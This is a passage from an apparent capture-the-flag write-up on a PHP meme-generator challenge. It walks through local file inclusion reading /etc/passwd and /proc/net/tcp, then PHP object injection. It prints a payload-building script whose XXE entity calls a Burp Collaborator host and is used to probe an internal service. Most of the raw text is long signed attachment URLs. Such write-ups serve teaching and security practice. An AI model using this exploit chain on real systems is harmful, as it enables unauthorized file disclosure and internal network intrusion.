vBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1d320493ce1f06a750125f678cf2032b5b6ec314fad6951c8c7c8aa664c8afaa\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/632/76b616f7eb17e9a7534efe1428f4e8599117eedf/1.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1d320493ce1f06a750125f678cf2032b5b6ec314fad6951c8c7c8aa664c8afaa\" class=\"markdown-inline-image\"></a></p>\n\n<p>The text in QR-code can be revealed with any barcode reader and will result in <code>https://h1-5411.h1ctf.com</code>.<br>\nThe website seems contain a cool meme generator app which allows visitors to create memes and view own created memes.<br>\nIn the meme creation functionality, the user can provide top and bottom text for the meme and can use various meme templates.</p>\n\n<p>These meme templates are either images or fully text-based memes and the HTTP-request related to the generation looks something like the following:</p>\n<pre class=\"highlight plaintext\"><code>POST /api/generate.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://h1-5411.h1ctf.com/generate.php\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 64\nCookie: PHPSESSID=SESS_ID_HERE\nDNT: 1\nConnection: close\n\ntemplate=template4.txt&amp;type=text&amp;top-text=top&amp;bottom-text=bottom\n</code></pre>\n<p>The value of <code>template</code>-param looks awfully similar to a filename so I tested for a simple LFI with value <code>../templates/template4.txt</code> and <code>../nonexisting/template4.txt</code>.<br>\nThe server response confirmed, that the LFI exists as the payload with <code>templates</code>-directory was accepted.</p>\n\n<p>Now by supplying a local file such as <code>../../../../../../etc/passwd</code>, I could view the file content on <code>Your memes</code>-page:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/630/4ec4a49b34b327cd1252033919e105805cc8c99a/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=bda861085b276d15613e2abb15d7412af7f10b428bd8ab7b7e1c97f34d86faf3\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/630/4ec4a49b34b327cd1252033919e105805cc8c99a/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=bda861085b276d15613e2abb15d7412af7f10b428bd8ab7b7e1c97f34d86faf3\" class=\"markdown-inline-image\"></a></p>\n\n<p>By using the LFI, I could download PHP source code files for the application which allowed source code auditing for further vulnerabilities.<br>\nThe <code>includes/header.php</code>-file was examined and it disclosed some interesting hidden PHP-files:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n  $pages = [\n    &quot;generate.php&quot; =&gt; &quot;Meme Generator&quot;,\n    &quot;memes.php&quot; =&gt; &quot;Your Memes&quot;,\n    // for version 2.0\n    // &quot;import_memes_2.0.php&quot; =&gt; &quot;Import Memes&quot;,\n    // &quot;export_memes_2.0.php&quot; =&gt; &quot;Export Memes&quot;\n  ];\n?&gt;\n</code></pre>\n<p>The files can be accessed with web browser and look like below:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"4.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/629/699d7e5853282e9bb4e1d90acefd2362dd3c7806/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e4c6f428c40b49d5eb54455f8a2837b688708e346c1babeb5595d02a9e140e18\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/629/699d7e5853282e9bb4e1d90acefd2362dd3c7806/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e4c6f428c40b49d5eb54455f8a2837b688708e346c1babeb5595d02a9e140e18\" class=\"markdown-inline-image\"></a></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"5.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/628/0bbdcac9115a0725605360302496268b54005dcc/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9539376bb331f9f91ebe418bbc6009b9c5c3b6b5b27f4d01054761573cfbefbc\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/628/0bbdcac9115a0725605360302496268b54005dcc/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9539376bb331f9f91ebe418bbc6009b9c5c3b6b5b27f4d01054761573cfbefbc\" class=\"markdown-inline-image\"></a></p>\n\n<p>The <code>export_memes_2.0.php</code>-functionality could be used to download a memedump file, which contained a base64-encoded string. After base64 decoding (<code>cat 1537985183_export.memepak |base64 -d</code>), the file content looked like this:</p>\n<pre class=\"highlight plaintext\"><code>a:12:{i:0;s:48:&quot;https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder&quot;;i:1;s:93:&quot;../data/memes/1537983470-a0c039413128d3221edc093bdcf24679318016d17d3db61763b25475736a0cbb.txt&quot;;i:2;s:93:&quot;../data/memes/1537983495-aa28dd914d7d01237e12da26261d5f4d771cb18e3649f68005dd0c27c6c1287d.txt&quot;;i:3;s:93:&quot;../data/memes/1537983517-84656938c714801a895a51ab86ceafa1c328be447202e5a371876d07b060b851.txt&quot;;i:4;s:93:&quot;../data/memes/1537983534-4ac7dad991b0d1709625d7a68c59e7c6f679d322c0878460dafeb4e36318ef2f.txt&quot;;i:5;s:93:&quot;../data/memes/1537983563-210bb9e4f61c7f5c57ee966d5e57f9d64cad68ce50d446b545bffaef83f73392.txt&quot;;i:6;s:93:&quot;../data/memes/1537983663-d82c657111d6c2329580cf4522cf4603d86769bf7d6a38cc9b9c14b5998e1726.txt&quot;;i:7;s:93:&quot;../data/memes/1537983665-588c0a89602b5d9fbc1404831fc5e241c4b4cebcc6e55060a7b5f4c9d084bb5f.txt&quot;;i:8;s:93:&quot;../data/memes/1537983700-790cb74d36ae7960e3f20299faba87f79404d5fc6d9151b43b4649f77c8ab7f8.txt&quot;;i:9;s:93:&quot;../data/memes/1537983704-714fd76ee28db5e95e5cc0a46ad083569a6c428a4e97a7cd2bc3d84a80317678.txt&quot;;i:10;s:93:&quot;../data/memes/1537983753-86db46d0fb6b0a1f6ff52bf55a07d59845f8c282b2fa6b25fa80f2c733d39e1c.txt&quot;;i:11;s:93:&quot;../data/memes/1537983756-8314e336fabb78250094d766914a579e4d7da95198ef4f3397ee6ddd92fd9cb2.txt&quot;;}\n</code></pre>\n<p>A trained eye can see pretty quickly that these are serialized PHP-objects. This same file could be imported with the <code>import_memes_2.0.php</code>-functionality which would add the memes to the <code>Your memes</code>-section.</p>\n\n<p>PHP-serialization functionalities lead fairly often to severe remote code execution bugs, so I decided to dig in and check if such exploit could be crafted.<br>\nThe <code>includes/classes.php</code>-file ( <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"classes.php\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/641/50fed91956172a83bada803217bb7206d4369ba7/classes.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=15b9f96a82d79992680e044d88b76a053a120052ed8dce5bace0e07caba03bf5\" data-attachment-type=\"text/x-php\">classes.php (F351641)</a> ) contains various classes which were examined and the <code>ConfigFile</code>-class looked like it could be used in the RCE exploit.<br>\nThe class has the following functions:</p>\n\n<ul>\n<li>\n<code>__construct</code> is the class constructor and it takes an URL which is downloaded and the page content is set as a value for the class object variable <code>config_raw</code>.</li>\n<li>\n<code>parse</code> tries to parse XML-data from the <code>config_ra\u1e81</code> and places values from it to the class object variables <code>top_text</code>, <code>bottom_text</code>, <code>template</code>, and <code>type</code>.</li>\n<li>\n<code>generate</code> generates an meme file from the XML-data.</li>\n<li>\n<code>__toString</code> runs <code>parse</code> and then returns a textual representation of the data parsed from the XML.</li>\n</ul>\n\n<p>The file also sets <code>libxml_disable_entity_loader(false);</code> which allows XML Entity declarations to be evaluated. This means that the parser is vulnerable to XXE-attacks.<br>\nThere is also a commented class <code>Maintenance</code> on the file with comment <code>Maintenance service: internal service on localhost, still under development!!</code>.</p>\n\n<p>By combining the above observations, I assumed that the PHP Object RCE should be used to launch an XXE attack towards the internal service.</p>\n\n<p>The below file was then crafted for the purpose of creating such serialized and base64-encoded PHP objects:</p>\n<pre class=\"highlight xml\"><code><span class=\"err\">&lt;</span>?php\n  libxml_disable_entity_loader(false);\n\n  class ConfigFile {\n    function __construct($url) {\n      $this-&gt;config_raw = &#39;<span class=\"cp\">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY sp SYSTEM &quot;&#39; . $url . &#39;&quot;&gt;</span>]&gt;<span class=\"nt\">&lt;dom&gt;&lt;toptext&gt;</span><span class=\"ni\">&amp;sp;</span><span class=\"nt\">&lt;/toptext&gt;&lt;bottomtext&gt;</span>bottom<span class=\"nt\">&lt;/bottomtext&gt;&lt;template&gt;</span>aaa<span class=\"nt\">&lt;/template&gt;&lt;type&gt;</span>2<span class=\"nt\">&lt;/type&gt;&lt;/dom&gt;</span>&#39;;\n    }\n  }\n\n\n$url = &quot;http://9cmzrgnaj6ydayoskjbmxlhv4maey3.burpcollaborator.net&quot;;\n$serialized = base64_encode(serialize([new ConfigFile($url)]));\necho $serialized;\n\n?&gt;\n</code></pre>\n<p>Next step was to test the above exploit. I created a payload which contained a Burp Collaborator URL as an external entity and sent the payload via the import-functionality.<br>\nNow when the <code>Your memes</code>-page was opened, the payload object was unserialized and the <code>__tostring</code>-function was ran which then ran the <code>parse</code>-functionality.<br>\nThis resulted in the Burp Collaborator getting an interaction from the server:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"6.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/627/77143d2e86b3ee76819b9d6f7d66b884c4a8a5dc/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=93b66e1f6a9816b67d8f53fc45f7df388c9c760f58e928ecfba3762afb8e8ef5\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/627/77143d2e86b3ee76819b9d6f7d66b884c4a8a5dc/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=93b66e1f6a9816b67d8f53fc45f7df388c9c760f58e928ecfba3762afb8e8ef5\" class=\"markdown-inline-image\"></a></p>\n\n<p>Great! We can now XXE through RCE :D</p>\n\n<p>Next step was to figure out the port where the internal service is located. I was lazy and did not want to portscan with the XXE so I used the LFI-vulnerability to download the <code>/proc/net/tcp</code>-file which disclosed all listening ports. There was only one port listening and it was <code>1337</code>. <br>\nThe XXE was used to connect to this port and the HTTP-response could be seen in the <code>Your memes</code>-page on the specific meme&#39;s section:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"7.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/625/92ca2355abb91800d80f5578290bd154850f0cdc/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=57a54743a9f92a3e710e9c06281ef70007ff4e03790acfb96eeaedc4c8baf0ef\" data-attachment-type=\"image/png\"><img 